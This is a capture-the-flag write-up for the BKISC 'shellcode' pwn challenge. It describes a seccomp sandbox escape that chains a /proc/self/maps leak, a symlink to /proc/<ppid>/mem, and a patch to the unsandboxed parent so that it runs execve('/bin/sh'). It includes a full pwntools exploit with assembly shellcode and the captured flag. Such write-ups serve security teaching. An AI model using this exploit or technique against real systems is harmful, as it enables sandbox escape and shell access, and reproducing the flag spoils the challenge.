---
title: "shellcode"
ctf: "BKISC"
date: 2026-05-10
category: pwn
difficulty: medium
flag_format: "BKISC{...}"
---

# shellcode

## Summary

A 64-bit PIE binary asks for a filename (opens it as fd), then forks a child that reads shellcode from stdin and executes it under a strict seccomp sandbox. The seccomp filter only allows `open()` with a single hardcoded filename pointer. The bypass chains `/proc/self/maps` leak, symlink redirection, and `/proc/ppid/mem` to patch the unsandboxed parent process with `execve("/bin/sh")`.

## Solution

### Step 1: Understand the sandbox

The parent calls `open(user_input, O_RDONLY)` then `fork()`. The child mmaps RWX memory at `0x1337000`, reads up to 0xfc9 bytes of shellcode at offset 0x37, applies `mprotect` to make it RX, installs seccomp, then jumps to the shellcode.

Seccomp (BPF filter) allows only:
- `read`, `write`, `close`, `lseek`, `stat`, `fstat`, `lstat`, `poll`
- `open` — only when `arg0 == PIE_base + 0x30b0` (the string `"./not_a_real_flag.txt"` in `.rodata`)

Everything else (mmap, mprotect, execve, fork, getdents, openat, …) triggers `KILL`.

The parent calls `wait(0)` and blocks — it has **no seccomp**.

### Step 2: Leak PIE base via inherited fd

The parent opens our supplied filename before forking and before seccomp, so the child inherits the fd. Send `/proc/self/maps` as the filename, then have shellcode read the fd and parse the PIE base of the `chall` binary.

On the remote, the inherited fd is **6** (not 3) because the proxy layer opens extra descriptors.

### Step 3: Redirect open() to parent memory

Seccomp only allows `open()` when the pointer equals `PIE_base + 0x30b0`. Use a symlink:

1. `unlink("./not_a_real_flag.txt")` — clean up stale symlinks
2. `getppid()` — get parent PID
3. `symlink("/proc/<ppid>/mem", "./not_a_real_flag.txt")`
4. `open(PIE_base + 0x30b0, O_RDWR)` — passes seccomp check, returns fd to parent's memory

### Step 4: Patch parent, get shell

The parent is blocked on `wait(0)` at `PIE_base + 0x13B3`. Use `lseek` + `write` via `/proc/ppid/mem` to overwrite the return site with `execve("/bin/sh", NULL, NULL)` shellcode. When the child exits, the parent returns into `/bin/sh`.

```python
#!/usr/bin/env python3
from pwn import *
import time

context.arch = 'amd64'
HOST, PORT = '127.0.0.1', 3000
PARENT_WAIT_RET = 0x13B3
OPEN_OK_PTR = 0x30B0
MAPS_FD = 6

parent_sc = asm("""
    mov rax, 0x68732f6e69622f
    push rax
    mov rdi, rsp
    xor esi, esi
    xor edx, edx
    mov eax, 59
    syscall
""")

stage1 = asm(f"""
    mov r12, rdi
    mov rsp, rdi
    add rsp, 0x900
    mov edi, {MAPS_FD}
    mov rsi, r12
    mov edx, 0x1000
    xor eax, eax
    syscall
    mov rbx, r12
find_line:
    mov r9, rbx
scan_line:
    mov al, byte ptr [rbx]
    test al, al
    je fail
    cmp al, 0x0a
    je next_line
    cmp dword ptr [rbx], 0x6c616863
    jne cont_scan
    cmp byte ptr [rbx+4], 'l'
    je got_line
cont_scan:
    inc rbx
    jmp scan_line
next_line:
    inc rbx
    jmp find_line
got_line:
    mov rbx, r9
    xor eax, eax
parse_hex:
    movzx edx, byte ptr [rbx]
    cmp dl, '-'
    je got_base
    shl rax, 4
    cmp dl, '9'
    jle hex_num
    and dl, 0xdf
    sub dl, 'A' - 10
    jmp hex_add
hex_num:
    sub dl, '0'
hex_add:
    movzx edx, dl
    add rax, rdx
    inc rbx
    jmp parse_hex
got_base:
    mov r13, rax
    lea rdi, [rip+fakeflag]
    mov eax, 87
    syscall
    mov eax, 110
    syscall
    mov r15d, eax
    lea r14, [r12+0x100]
    mov dword ptr [r14], 0x6f72702f
    mov word ptr [r14+4], 0x2f63
    mov eax, r15d
    lea rsi, [rsp+0x40]
    xor ecx, ecx
    mov ebx, 10
itoa_loop:
    xor edx, edx
    div ebx
    add dl, '0'
    dec rsi
    mov byte ptr [rsi], dl
    inc ecx
    test eax, eax
    jne itoa_loop
    lea rdi, [r14+6]
copy_digits:
    mov al, byte ptr [rsi]
    mov byte ptr [rdi], al
    inc rsi
    inc rdi
    dec ecx
    jne copy_digits
    mov dword ptr [rdi], 0x6d656d2f
    mov byte ptr [rdi+4], 0
    mov rdi, r14
    lea rsi, [rip+fakeflag]
    mov eax, 88
    syscall
    lea rdi, [r13 + {OPEN_OK_PTR}]
    mov esi, 2
    xor edx, edx
    mov eax, 2
    syscall
    mov rbx, rax
    mov rdi, rbx
    mov rsi, r13
    add rsi, {PARENT_WAIT_RET}
    xor edx, edx
    mov eax, 8
    syscall
    mov rdi, rbx
    lea rsi, [rip+parent_payload]
    mov edx, {len(parent_sc)}
    mov eax, 1
    syscall
    xor edi, edi
    mov eax, 60
    syscall
fail:
    mov edi, 1
    mov eax, 60
    syscall
fakeflag:
    .asciz "./not_a_real_flag.txt"
parent_payload:
    .byte {','.join(hex(b) for b in parent_sc)}
""")

io = remote(HOST, PORT)
io.recv(timeout=5)
io.send(b'/proc/self/maps\x00\n')
io.recv(timeout=5)
io.send(stage1)

time.sleep(0.5)
io.sendline(b'cat /*.txt')
io.sendline(b'cat /opt/chal/*.txt')
print(io.recvall(timeout=8).decode(errors='replace'))
io.close()
```

### Step 5: Find the random flag filename

The flag file has a random name (`GThaswapsoe8lPDg.txt`) in `/`. Since we have a shell, just `cat /*.txt` or `ls /` to find it.

On the local test instance the flag was at `./flag.txt` with a placeholder value; the real flag is only on the remote.

## Flag

```
BKISC{74f4dcb6b6ba_L1ke_1A7her_lIk3_S#n_wA!t_THAt$_n0T_wHAT_i_mEANt}
```
